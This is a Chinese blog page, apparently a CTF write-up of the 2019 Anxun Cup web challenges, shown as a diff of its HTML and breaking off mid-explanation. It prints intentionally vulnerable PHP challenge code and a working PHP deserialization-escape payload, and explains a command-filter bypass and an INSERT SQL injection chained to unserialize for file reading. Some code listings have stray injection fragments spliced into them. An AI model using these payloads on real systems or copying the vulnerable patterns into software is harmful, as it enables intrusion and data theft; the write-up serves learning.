@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/lihuaiqiu.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="离怀秋" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言周末来打了一下这个比赛，比赛质量蛮好的，差一点就三个一血了，执着于调试Tp6的pop了，后来发现换一个pop就好了(错失了一血)，反思下了自己，感觉有时候做题有点不冷静，也使我错失了很多东西。 easy_web第一个参数解两次base64加一次md5,传index进去拿到源码， (正则有点小问题，导致了非预期)\ bypass下命令执行 c\at flag 拿到flag easy_serial">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019安洵杯web题解">
+<meta property="og:url" content="http://yoursite.com/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="前言周末来打了一下这个比赛，比赛质量蛮好的，差一点就三个一血了，执着于调试Tp6的pop了，后来发现换一个pop就好了(错失了一血)，反思下了自己，感觉有时候做题有点不冷静，也使我错失了很多东西。 easy_web第一个参数解两次base64加一次md5,传index进去拿到源码， (正则有点小问题，导致了非预期)\ bypass下命令执行 c\at flag 拿到flag easy_serial">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/02/Quc6T1.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/02/Quvx0A.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/02/Qux5jg.png">
+<meta property="article:published_time" content="2019-12-02T15:42:38.000Z">
+<meta property="article:modified_time" content="2019-12-02T15:43:20.000Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/12/02/Quc6T1.md.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/02/2019安洵杯web题解/"/>
+
+
+
+
+
+  <title>2019安洵杯web题解 | 离怀秋</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/lihuaiqiu" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">离怀秋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">穷且益坚，不负青云之志</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="离怀秋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="离怀秋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019安洵杯web题解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-02T23:42:38+08:00">
+                2019-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>周末来打了一下这个比赛，比赛质量蛮好的，差一点就三个一血了，执着于调试Tp6的pop了，后来发现换一个pop就好了(错失了一血)，反思下了自己，感觉有时候做题有点不冷静，也使我错失了很多东西。</p>
+<h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>第一个参数解两次base64加一次md5,传index进去拿到源码，</p>
+<p>(正则有点小问题，导致了非预期)\ bypass下命令执行 c\at flag 拿到flag</p>
+<h3 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显的可以看到用了filter函数去处理了序列化数据，并且替换为空，这样就造成了反序列化字符逃逸，通过extract变量覆盖，配合字符逃逸把原本的img字段吞掉就可以的</p>
+<p>构造payload： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&amp;_SESSION[img]&#x3D;1&amp;_SESSION[&quot;;s:2:&quot;im&quot;;s:2:&quot;11&quot;;s:3:&quot;img]&#x3D;L2QwZzNfZmxsbGxsbGFn</span><br></pre></td></tr></table></figure>
+
+<h3 id="iamthinking"><a href="#iamthinking" class="headerlink" title="iamthinking"></a>iamthinking</h3><p>挺可惜的一道题，一直在调试我原来跟进的payload，错失了一血</p>
+<p>最后换了个pop就打通了(最后拿了三血…,数组bypass一下首字符为O的匹配就ok了</p>
+<h3 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h3><p>被解码坑死..，源码如下</p>
+<p>主要审计下这个helper类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line">    <span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">    $array = <span class="keyword">array</span>();</span><br><span class="line">    $array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">    $array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">    $array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">    $img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    $my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">    $array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">    $id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line">    <span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">        $rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    $filename = $info[<span class="string">"name"</span>];</span><br><span class="line">    $ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">    $cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    $con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line">    <span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">    &#125;</span><br><span class="line">    $sql_fields = <span class="keyword">array</span>();</span><br><span class="line">    $sql_val = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        $key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">        $value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">        $sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">        $sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">    &#125;                                                                           <span class="string">','</span><span class="string">','</span><span class="string">','</span><span class="number">1</span><span class="string">');insert into images (`title`,`filename`,`ext`,`attr`) VALUES('</span></span><br><span class="line">    $sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">    insert into images(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>) values(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    mysqli_query($con, $sql);</span><br><span class="line">    $id = mysqli_insert_id($con);</span><br><span class="line">    mysqli_close($con);</span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        <span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">    &#125;</span><br><span class="line">    $content = file_get_contents($path);</span><br><span class="line">    <span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment"># Read some config html</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>helper类存在一些漏洞点</p>
+<p>触发点还是明显的通过__destruct触发view_files去任意读文件，找一下触发点，在show.php中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">    $result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">            <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">                $attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">                $attr = unserialize($attr_temp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只对attr字段进行反序列化，所以我们要把attr字段放入我们的序列化数据，看这道题出现的\0\0\0和chr(0).’*’.chr(0)字段，就想起了前段时间看到的Joomla rce，导致我开始的思路有点偏..浪费了不少时间，其实和这个rce并没有关系..</p>
+<p>首先可以发现在helper.php中存在insert注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">    $key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">    $value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">    $sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">    $sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;                                                                           <span class="string">','</span><span class="string">','</span><span class="string">','</span><span class="number">1</span><span class="string">');insert into images (`title`,`filename`,`ext`,`attr`) VALUES('</span></span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">insert into images(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>) values(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure>
+
+<p>并没有对输入进去的数据进行处理，单引号即可闭合，然后就是一个坑点了.其实到了这步思路就很清晰了，通过insert注入把我们的序列化数据注入，然后触发show.php的反序列化直接拿到flag,接下来就是我自己的踩坑记了</p>
+<p>首先踩了Insert注入这个坑</p>
+<p>题目提示源码泄露，拿到的源码通过upload函数可以看出其实是四个字段的..</p>
